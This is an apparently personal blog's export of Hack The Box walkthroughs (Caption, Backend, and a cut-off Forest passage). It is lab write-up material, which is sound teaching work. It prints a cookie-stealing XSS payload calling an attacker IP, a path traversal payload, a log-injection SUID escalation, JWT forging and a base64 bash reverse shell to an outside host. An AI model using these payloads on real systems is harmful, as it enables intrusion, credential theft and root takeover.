[{"content":"","date":"14 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"14 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/","section":"Secure The Throne","summary":"","title":"Secure The Throne","type":"page"},{"content":" Reconnaissance # On scanning the ports we can see that there are three ports open We got two web services running. which are on port 80 caption and on port 8080 git bucket More importantly after some recon I come to know about a login page on port 80 which is caption, however we don\u0026rsquo;t have the credentials yet so I started digging further The Gitbucket on port 8000 had two repos, interesting isn\u0026rsquo;t it The repository files didn\u0026rsquo;t give that much of valuable information. but\u0026hellip; Enumeration # I got tired of the repo files so I checked commits, the recent commits were done by user Administrator where the old were done by user root So I tried enumerating the commits further and on accessing the commit Access control, I saw credentials in the chage Those creds worked on the login page on caption(port 80), So using the creds I was able to log in on Caption-Portal\nIt looked like a typical hack the box page but when I tried accessing /logs from the caption-portal it showed me access denied error. But at initially on seeing it I was happy cause I thought I could have command injection or something. But if you think about it which is unlikely now. After a while, I found that there is a cache server running along with the web server, which is called varnish, Actually we could\u0026rsquo;ve learned about this from the source code(repo) too Varnish Cache is a web application accelerator also known as a caching HTTP reverse proxy. You install it in front of any server that speaks HTTP and configure it to cache the contents.\nApparently this caching server will cache the same page for all users for quick loading of contents\nAgain after a while I found that when using X-Forwaded-Host: header on the request of pages like /home and /firewalls actually loads it\u0026rsquo;s value on the response and caches the same page for everyone(including admin) using varnish caching server. \u0026#34; \u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;new Image().src=\u0026#34;https://10.10.14.12:8000/?c=\u0026#34;+document.cookie;\u0026lt;/script\u0026gt; So I made and used the the above xss payload to get admin cookie which was successful. Even after including the admin cookie, still haproxy blocking my request to the page /logs which was frustrating I was searching for a tool to bypass this, fortunatly one friend suggested me this great tool called h2csmuggler and using that tool I was easily able to bypass the 403 of /logs From the response I got the location of logs files After hours of checking the logs files, I came to know that it didn\u0026rsquo;t has anything useful, Full of garbage h2csmuggler.py -x http://caption.htb:80 -H \u0026#39;Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzM1NDY5NTAzfQ.KlugtV3zNPowolIMi0EUkDB_CFUx0MdmDSkNWEX1KHo\u0026#39; \u0026#39;http://caption.htb:80/download\u0026lt;redacted\u0026gt; See it\u0026rsquo;s garbage contents yourselves But on visiting the plain url without the logs path it rather reveals something interesting These ./cpr folders are looking interesting aren\u0026rsquo;t they Researched about them and found a vulnerability in copyparty, Which includes a path traversal vulnerability on versions 1.8.2 The POC looked like this: curl -i -s -k -X GET \u0026#39;http://127.0.0.1:3923/.cpr/%2Fetc%2Fpasswd\u0026#39; The above path also has SSRF vulnerability Exploitation # Using this plainly didn\u0026rsquo;t work for me But with little twerk, actually have to double encode the payload This was my initial payload to read /etc/passwd .cpr//etc/passwd The Final URL encoded payload: %2e%63%70%72%2f%25%32%46%65%74%63%25%32%46%70%61%73%73%77%64 As this was working, for SSH access I tried to read id_rsa for user margo and got nothing, then after some hours I figured that it\u0026rsquo;s not a RSA key that I should look for\u0026hellip; /.cpr//home/margo/.ssh/id_ecdsa Logged in with the key and got the User flag Don\u0026rsquo;t worry guys we are halfway through Privilege Escalation # I started enumerating with internal services and we got multiple services but one looks particularly interesting ss -tunlp The reason is, there is a code mentioning about port 9090 within the gitbucket\u0026rsquo;s Logservice repo So as usual as I reverse forwarded that particular service port to my host machine There were no interface I was stuck here so I researched the repo again and learned about Thrift. Where Thrift is used to connect with log services. Researched on Thrift View articles Link-1 Link-2\nAlso after some further enumeration and code review I found a really bad code on the log service This regex code snippet reads a arbitary log file and takes the values of User-Agent from, it takes timestamp\u0026rsquo;s value. Also it notes the IP address which is not potential for this context This can be exploited by injecting a command within the user agent of log files. As the code configured to read the user-agent value, the injected command would be executed. For this to be done we need Thrift installed on the local machine. Then we need a client on the local machine to tell the Log service to read our malicious file on the target using thrift. When it reads the log file our command will be executed. So I installed Thrift using pip3 pip3 install thrift To create the client, first we have to create an api configuration file for the client Created a file named api2.thrift with this following code namespace py log_service exception LogServiceException { 1: string message } service LogService { /** * Reads the log file from the specified file path. * @param filePath - The path of the log file to read. * @return string - A message indicating the processing status. * @throws LogServiceException - If an error occurs during processing. */ string ReadLogFile(1: string filePath) throws (1: LogServiceException error) } Installed compiler using sudo apt install thrift-compiler although not recommended Ran the following command and created modules directory in python language thrift --gen py api2.thrift Inside the directory I created client.py file with this code from thrift import Thrift from thrift.transport import TSocket from thrift.transport import TTransport from thrift.protocol import TBinaryProtocol from log_service import LogService # Import generated Thrift client code def main(): # Set up a transport to the server transport = TSocket.TSocket(\u0026#39;localhost\u0026#39;, 9090) # Buffering for performance transport = TTransport.TBufferedTransport(transport) # Using a binary protocol protocol = TBinaryProtocol.TBinaryProtocol(transport) # Create a client to use the service client = LogService.Client(protocol) # Open the connection transport.open() try: # Specify the log file path to process log_file_path = \u0026#34;/tmp/bad.log\u0026#34; # Call the remote method ReadLogFile and get the result response = client.ReadLogFile(log_file_path) print(\u0026#34;Server response:\u0026#34;, response) except Thrift.TException as tx: print(f\u0026#34;Thrift exception: {tx}\u0026#34;) # Close the transport transport.close() if __name__ == \u0026#39;__main__\u0026#39;: main() After that I created two files One is bad.log file with this as content 999.9.9.9 \u0026#34;user-agent\u0026#34;:\u0026#34;\u0026#39;; /bin/bash /tmp/bad.sh #\u0026#34; Second is bad.sh file with this chmod +s /bin/bash Transferred both the files to the /tmp folder of the target system and also gave appropriate permissions From the host hosted a python server From the target system All complications are over. By now if client.py is executed it will speak with the Log-service and make it to read the file /tmp/bad.log As the file contains malicious code. It will make the Log-service to execute a script named bad.sh as root. The script will give SUID permissions to /bin/bash making it to be executed as root by anyone. Fired the script successfully Our exploit worked\u0026hellip;. It was a success Executing the /bin/bash with preserve flag -p gave a shell as root. Finally got the Root flag Feedback: This box was awesome at same time it was a misery. It took me 5 days to pwn this box. ","date":"12 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/posts/1741762551259-caption-walkthroughhtb/","section":"Posts","summary":"","title":"Caption Walkthrough(HTB)","type":"posts"},{"content":"","date":"12 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/series/hack-the-box/","section":"Series","summary":"","title":"Hack the Box","type":"series"},{"content":"","date":"12 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/hacking/","section":"Tags","summary":"","title":"Hacking","type":"tags"},{"content":"","date":"12 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/hard/","section":"Tags","summary":"","title":"Hard","type":"tags"},{"content":"","date":"12 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/htb/","section":"Tags","summary":"","title":"HTB","type":"tags"},{"content":"","date":"12 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"","date":"12 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","date":"12 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"12 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/walkthrough/","section":"Tags","summary":"","title":"Walkthrough","type":"tags"},{"content":"","date":"12 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":" Reconnaissance \u0026amp; Enumeration # Nmap scan results: 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 80/tcp open http Uvicorn |_http-title: Site doesn\u0026#39;t have a title (application/json). | http-methods: |_ Supported Methods: GET Device type: general purpose Running: Linux 4.X|5.X OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 OS details: Linux 4.15 - 5.19 Uptime guess: 17.734 days (since Sun Feb 16 04:30:26 2025) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=255 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 3306/tcp) HOP RTT ADDRESS 1 265.74 ms 10.10.14.1 2 265.82 ms 10.10.11.161 After hours of fuzzing I found multiple endpoints, where by simply playing with endpoints in burp we can reveal more. But one in particular /docs asks for authentication cookie. We can also do directory fuzzing in recursive mode with any tool but I personally found the endpoints just by guessing them. There is one signup endpoint which is api/v1/user/signup. Using this endpoint I can create an account. After enumerating further on that endpoint I found all the data parameters of it. Now I can create an account using this curl -v -X POST \u0026#39;http://10.10.11.161/api/v1/user/signup\u0026#39; -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{\u0026#34;email\u0026#34;:\u0026#34;Emp5r0R@king.com\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;password\u0026#34;}\u0026#39; | jq Eventually I found another endpoint which is /login. But initially it was showing error on sending the json data but it turns out this endpoint only accept HTML data. I curled the endpoint curl -v \u0026#39;http://10.10.11.161/api/v1/user/login\u0026#39; -d \u0026#39;username=Emp5r0R@king.com\u0026amp;password=password\u0026#39; | jq . In return I got the JWT token Curl Output: I used this extension to modify the header, I could\u0026rsquo;ve used burp interceptor but for some reason it didn\u0026rsquo;t worked for me as intended. I tried to access /docs endpoint with providing the token, After including it, I was redirected to FastAPI interface. Surpisingly,SecretFlagEndpoint straight out gave User flag I didn\u0026rsquo;t expect this After some enumeration I found this endpoint /api/v1/user/0 which on modifying the Id parameter spits out user information. This Id 1 gave me the admin details.\ncurl -X \u0026#39;GET\u0026#39; \\ \u0026#39;http://10.10.11.161/api/v1/user/1\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; | jq I can change password of any user If I had guid, As I already have the guid of user admin I can change admin account\u0026rsquo;s password by curling this endpoint /api/v1/user/updatepass with valid data. curl -X \u0026#39;POST\u0026#39; \\ \u0026#39;http://10.10.11.161/api/v1/user/updatepass\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; \\ -H \u0026#39;Content-Type: application/json\u0026#39; \\ -d \u0026#39;{ \u0026#34;guid\u0026#34;: \u0026#34;36c2e94a-4271-4259-93bf-c96ad5948284\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;emperor\u0026#34; }\u0026#39; Using the newly changed password I authorized myself with FastAPI Now I can access admin endpoints as I am an admin now to FastAPI Here the endpoint file seems to be useful, actually I can read arbitary files using this endpoint. First let me try and access /etc/passwd\ncurl -X \u0026#39;POST\u0026#39; \\ \u0026#39;http://10.10.11.161/api/v1/admin/file\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; \\ -H \u0026#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.eL4UaJ5NCf-TEpWdq21t-kEbO-7YJTmmLLkooJussuE\u0026#39; \\ -H \u0026#39;Content-Type: application/json\u0026#39; \\ -d \u0026#39;{ \u0026#34;file\u0026#34;: \u0026#34;/etc/passwd\u0026#34; }\u0026#39; | jq It was successfull However when I try to run commands using this endpoint /api/v1/admin/exec/\u0026lt;commands\u0026gt; I get this error. Hmm\u0026hellip; what could it be 🤔 From /etc/passwd I got to know that user htb has bash access. Exploitation # To identify the web application running directory I can request to read this file path /proc/self/environ. From reading the file I identified the running directory of this web. curl -X \u0026#39;POST\u0026#39; \\ \u0026#39;http://10.10.11.161/api/v1/admin/file\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; \\ -H \u0026#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.eL4UaJ5NCf-TEpWdq21t-kEbO-7YJTmmLLkooJussuE\u0026#39; \\ -H \u0026#39;Content-Type: application/json\u0026#39; \\ -d \u0026#39;{ \u0026#34;file\u0026#34;: \u0026#34;/proc/self/environ\u0026#34; }\u0026#39; | jq -r \u0026#39;.file\u0026#39; The path should be this /home/htb/uhc/app/main.py I requested for the source code using file endpoint and got it import asyncio from fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends from fastapi_contrib.common.responses import UJSONResponse from fastapi import FastAPI, Depends, HTTPException, status from fastapi.security import HTTPBasic, HTTPBasicCredentials from fastapi.openapi.docs import get_swagger_ui_html from fastapi.openapi.utils import get_openapi from typing import Optional, Any from pathlib import Path from sqlalchemy.orm import Session from app.schemas.user import User from app.api.v1.api import api_router from app.core.config import settings from app import deps from app import crud app = FastAPI(title=\u0026#34;UHC API Quals\u0026#34;, openapi_url=None, docs_url=None, redoc_url=None) root_router = APIRouter(default_response_class=UJSONResponse) @app.get(\u0026#34;/\u0026#34;, status_code=200) def root(): \u0026#34;\u0026#34;\u0026#34; Root GET \u0026#34;\u0026#34;\u0026#34; return {\u0026#34;msg\u0026#34;: \u0026#34;UHC API Version 1.0\u0026#34;} @app.get(\u0026#34;/api\u0026#34;, status_code=200) def list_versions(): \u0026#34;\u0026#34;\u0026#34; Versions \u0026#34;\u0026#34;\u0026#34; return {\u0026#34;endpoints\u0026#34;:[\u0026#34;v1\u0026#34;]} @app.get(\u0026#34;/api/v1\u0026#34;, status_code=200) def list_endpoints_v1(): \u0026#34;\u0026#34;\u0026#34; Version 1 Endpoints \u0026#34;\u0026#34;\u0026#34; return {\u0026#34;endpoints\u0026#34;:[\u0026#34;user\u0026#34;, \u0026#34;admin\u0026#34;]} @app.get(\u0026#34;/docs\u0026#34;) async def get_documentation( current_user: User = Depends(deps.parse_token) ): return get_swagger_ui_html(openapi_url=\u0026#34;/openapi.json\u0026#34;, title=\u0026#34;docs\u0026#34;) @app.get(\u0026#34;/openapi.json\u0026#34;) async def openapi( current_user: User = Depends(deps.parse_token) ): return get_openapi(title = \u0026#34;FastAPI\u0026#34;, version=\u0026#34;0.1.0\u0026#34;, routes=app.routes) app.include_router(api_router, prefix=settings.API_V1_STR) app.include_router(root_router) def start(): import uvicorn uvicorn.run(app, host=\u0026#34;0.0.0.0\u0026#34;, port=8001, log_level=\u0026#34;debug\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: # Use this for debugging purposes only import uvicorn uvicorn.run(app, host=\u0026#34;0.0.0.0\u0026#34;, port=8001, log_level=\u0026#34;debug\u0026#34;) This is just a basic code let\u0026rsquo;s analyze other files. From the import headers I can learn about other file locations. from app.schemas.user import User from app.api.v1.api import api_router from app.core.config import settings On requesting/app/core/config.py I got the jwt secret from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator from typing import List, Optional, Union from enum import Enum class Settings(BaseSettings): API_V1_STR: str = \u0026#34;/api/v1\u0026#34; JWT_SECRET: str = \u0026#34;SuperSecretSigningKey-HTB\u0026#34; ALGORITHM: str = \u0026#34;HS256\u0026#34; # 60 minutes * 24 hours * 8 days = 8 days ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 8 # BACKEND_CORS_ORIGINS is a JSON-formatted list of origins # e.g: \u0026#39;[\u0026#34;http://localhost\u0026#34;, \u0026#34;http://localhost:4200\u0026#34;, \u0026#34;http://localhost:3000\u0026#34;, \\ # \u0026#34;http://localhost:8080\u0026#34;, \u0026#34;http://local.dockertoolbox.tiangolo.com\u0026#34;]\u0026#39; BACKEND_CORS_ORIGINS: List[AnyHttpUrl] = [] @validator(\u0026#34;BACKEND_CORS_ORIGINS\u0026#34;, pre=True) def assemble_cors_origins(cls, v: Union[str, List[str]]) -\u0026gt; Union[List[str], str]: if isinstance(v, str) and not v.startswith(\u0026#34;[\u0026#34;): return [i.strip() for i in v.split(\u0026#34;,\u0026#34;)] elif isinstance(v, (list, str)): return v raise ValueError(v) SQLALCHEMY_DATABASE_URI: Optional[str] = \u0026#34;sqlite:///uhc.db\u0026#34; FIRST_SUPERUSER: EmailStr = \u0026#34;root@ippsec.rocks\u0026#34; class Config: case_sensitive = True settings = Settings() Forging JWT Token Earlier while trying to access /execute/\u0026lt;Command\u0026gt; I got missing debug key error I can forge a JWT with debug option included. On working on this I got error because Of time skew between the target(JWT Token) and my system is too high. So I made this program to display the time stamp from the token import jwt import time import datetime token = \u0026#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.eL4UaJ5NCf-TEpWdq21t-kEbO-7YJTmmLLkooJussuE\u0026#34; decoded_payload = jwt.decode(token, options={\u0026#34;verify_signature\u0026#34;: False}) print(decoded_payload) iat_timestamp = decoded_payload[\u0026#39;iat\u0026#39;] current_time_timestamp = int(time.time()) print(f\u0026#34;iat timestamp: {iat_timestamp}\u0026#34;) print(f\u0026#34;current time timestamp: {current_time_timestamp}\u0026#34;) print(f\u0026#34;iat datetime: {datetime.datetime.fromtimestamp(iat_timestamp)}\u0026#34;) print(f\u0026#34;current datetime: {datetime.datetime.fromtimestamp(current_time_timestamp)}\u0026#34;) This was the output, As we can see the time skew is 3 hours(approx). So I made the code to adapt to the time and forged jwt token import jwt import datetime token = \u0026#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.eL4UaJ5NCf-TEpWdq21t-kEbO-7YJTmmLLkooJussuE\u0026#34; secret = \u0026#34;SuperSecretSigningKey-HTB\u0026#34; leeway = datetime.timedelta(hours=3) decoder = jwt.decode(token, secret, [\u0026#34;HS256\u0026#34;], leeway=leeway) print(decoder) decoder[\u0026#34;debug\u0026#34;] = True # Adding debug option. encoded_token = jwt.encode(decoder, secret, algorithm=\u0026#34;HS256\u0026#34;) #encode the dictionary. print(f\u0026#34;Encoded token: {encoded_token}\u0026#34;) Got the token Using the token, I executed some commands via /api/admin/exec/\u0026lt;command\u0026gt; and It worked\ncurl -v -X \u0026#39;GET\u0026#39; \\ \u0026#39;http://10.10.11.161/api/v1/admin/exec/pwd\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; \\ -H \u0026#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.yWQeRZjjOrROK-XosRoR8lMf52e3YxNtX4bhj3haUBw\u0026#39; Getting reverse shell Encoded bash reverse shell payload into base64.\necho \u0026#39;bash -c \u0026#34;exec bash -i \u0026amp;\u0026gt;/dev/tcp/10.10.14.10/6001 \u0026lt;\u0026amp;1\u0026#34;\u0026#39; | base64 Then created this payload, here %20 represents white space in URL encoded form. The raw command here is echo \u0026lt;Base64-encoded-payload\u0026gt; | base64 -d | bash Final payload for reverse shell: curl -s \\ \u0026#39;http://10.10.11.161/api/v1/admin/exec/echo%20YmFzaCAtYyAiZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuMTAvNjAwMSA8JjEiCg==%20|%20base64%20-d%20|%20bash\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; \\ -H \u0026#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzQxOTM2OTU0LCJpYXQiOjE3NDEyNDU3NTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.yWQeRZjjOrROK-XosRoR8lMf52e3YxNtX4bhj3haUBw\u0026#39; Opened a netcat listener on my system (nc -lnvp 6001) and got the shell connection, then I upgraded the shell Privilege Escalation # Found a file called uhc.db It had password hash for my accounts and for other but nothing useful There was another interesting file named auth.log. Which had admin logon logs, Also it had a string which seemed out of place. Actually that was the password for root user. Got the Root flag ","date":"10 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/posts/1741592170890-backend-walkthroughhtb/","section":"Posts","summary":"","title":"Backend Walkthrough(HTB)","type":"posts"},{"content":"","date":"10 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/medium/","section":"Tags","summary":"","title":"Medium","type":"tags"},{"content":"I\u0026rsquo;m Emp5r0R, and I\u0026rsquo;m really into space and cybersecurity. This website? It\u0026rsquo;s my way of sharing all the cool stuff that sparks my curiosity. I\u0026rsquo;m a big believer in ethical hacking – it\u0026rsquo;s how I learn and explore. You\u0026rsquo;ll often find me on platforms like Hack The Box and Try Hack Me, getting my hands dirty and having fun.\n\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e Don\u0026rsquo;t forget to visit me on Hack The Box. Also I built this tool, a hash cracker which can rival even hashcat in terms of speed. Although it supports way less hashing algorithms for now, worry not I will keep on improving the tool.\nEmp5r0R/BananaCracker This is a super fast hash password cracker, which can take any password dictionary file as input for the purpose of cracking. Rust 2 0 ","date":"7 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/about/","section":"Secure The Throne","summary":"Learn more about me and why I started this site.","title":"$WHOAMI","type":"page"},{"content":"","date":"7 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/active-directory/","section":"Tags","summary":"","title":"Active Directory","type":"tags"},{"content":"","date":"7 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/database/","section":"Tags","summary":"","title":"Database","type":"tags"},{"content":"","date":"7 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/easy/","section":"Tags","summary":"","title":"Easy","type":"tags"},{"content":" Reconnaissance and Enumeration # Nmap scan results: PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-13 15:46:46Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49677/tcp open msrpc Microsoft Windows RPC 49684/tcp open msrpc Microsoft Windows RPC 49706/tcp open msrpc Microsoft Windows RPC 49976/tcp open msrpc Microsoft Windows RPC It\u0026rsquo;s always good to look for low hanging fruit, So checked SMB for guest or anonymous login but there isn\u0026rsquo;t any. Same with LDAP When it\u0026rsquo;s comes to enumeration my goto tool is always netexec. Netexec provides many options for Active Directory enumeration. I queried LDAP, ❯ netexec ldap htb.local -u anonymous -p anonymous SMB 10.10.10.161 445 FOREST [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) LDAP 10.10.10.161 389 FOREST [-] htb.local\\anonymous:anonymous Queried SMB, got nothing ❯ netexec smb htb.local -u sundeity -p \u0026#39;\u0026#39; SMB 10.10.10.161 445 FOREST [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) SMB 10.10.10.161 445 FOREST [-] htb.local\\sundeity: STATUS_LOGON_FAILURE Which was weird for an easy box, this triggered lot of questions inside me. On searching the web I found about a new technique. Apparently I can enumerate rpc using rpcclient. If you are more interested about this i\u0026rsquo;ll leave the articles link\nLinks to the Articles Article-1 Article-2\nUsing null login to connect with rpc rpcclient -U \u0026#34;\u0026#34; -N 10.10.10.161 Using the below command I can enumerate users on the domain enumdomusers Output: rpcclient $\u0026gt; enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] user:[$331000-VK4ADACQNUCA] rid:[0x463] user:[SM_2c8eef0a09b545acb] rid:[0x464] user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465] user:[SM_75a538d3025e4db9a] rid:[0x466] user:[SM_681f53d4942840e18] rid:[0x467] user:[SM_1b41c9286325456bb] rid:[0x468] user:[SM_9b69f1b9d2cc45549] rid:[0x469] user:[SM_7c96b981967141ebb] rid:[0x46a] user:[SM_c75ee099d0a64c91b] rid:[0x46b] user:[SM_1ffab36a2f5f479cb] rid:[0x46c] user:[HealthMailboxc3d7722] rid:[0x46e] user:[HealthMailboxfc9daad] rid:[0x46f] user:[HealthMailboxc0a90c9] rid:[0x470] user:[HealthMailbox670628e] rid:[0x471] user:[HealthMailbox968e74d] rid:[0x472] user:[HealthMailbox6ded678] rid:[0x473] user:[HealthMailbox83d6781] rid:[0x474] user:[HealthMailboxfd87238] rid:[0x475] user:[HealthMailboxb01ac64] rid:[0x476] user:[HealthMailbox7108a4e] rid:[0x477] user:[HealthMailbox0659cc1] rid:[0x478] user:[sebastien] rid:[0x479] user:[lucinda] rid:[0x47a] user:[svc-alfresco] rid:[0x47b] user:[andy] rid:[0x47e] user:[mark] rid:[0x47f] user:[santi] rid:[0x480] As I got the users now I copied all the users into a file. So that I can enumerate further with it. ❯ cat users.txt Administrator krbtgt sebastein lucinda svc-alfresco andy mark santi Like this isn\u0026rsquo;t enough we can also enumerate for groups in the domain using below command by querying RPC enumdomgroups We can also query information of a particular group with this command querygroup \u0026lt;sid\u0026gt; Now to our real path, I used kerbrute to verify the usernames that I got from RPC earlier and all of them were legit 🤗 ❯ kerbrute userenum --dc htb.local -d htb.local users.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: dev (n/a) - 01/13/25 - Ronnie Flathers @ropnop 2025/01/13 22:04:00 \u0026gt; Using KDC(s): 2025/01/13 22:04:00 \u0026gt; htb.local:88 2025/01/13 22:04:00 \u0026gt; [+] VALID USERNAME:\tAdministrator@htb.local 2025/01/13 22:04:00 \u0026gt; [+] VALID USERNAME:\tandy@htb.local 2025/01/13 22:04:00 \u0026gt; [+] VALID USERNAME:\tlucinda@htb.local 2025/01/13 22:04:00 \u0026gt; [+] VALID USERNAME:\tsanti@htb.local 2025/01/13 22:04:00 \u0026gt; [+] VALID USERNAME:\tsvc-alfresco@htb.local 2025/01/13 22:04:00 \u0026gt; [+] VALID USERNAME:\tmark@htb.local 2025/01/13 22:04:00 \u0026gt; Done! Tested 8 usernames (6 valid) in 0.198 seconds Exploitation # As I was desperatly looking for a low hanging fruit I checked user accounts that had DONT_REQUIRE_PREAUTH. Lucky me I got one user which is none other than svc-alfresco. This Pre-Auth concept is pretty simple let\u0026rsquo;s learn about it, As part of the Kerberos authentication process in Active Directory, there is an initial request to authenticate without a password. This is an artifact left over from Kerberos versions earlier than Kerberos 5. In these earlier versions, Kerberos would allow authentication without a password. Now, in Kerberos 5, a password is required, which is called “Pre-Authentication.” When looking at the Kerberos exchanges during log-on, you will initially see an AS-REQ (Authentication Server Request) followed by a Kerberos error, which will state that pre-auth is required. But in some cases accounts might be configured to authenticate without a Pre-Auth, well yeah which obiviously a misconfiguration. Using below the tool below I abused it and got the TGT from kerberos for i in $(cat users.txt); do GetNPUsers.py -no-pass 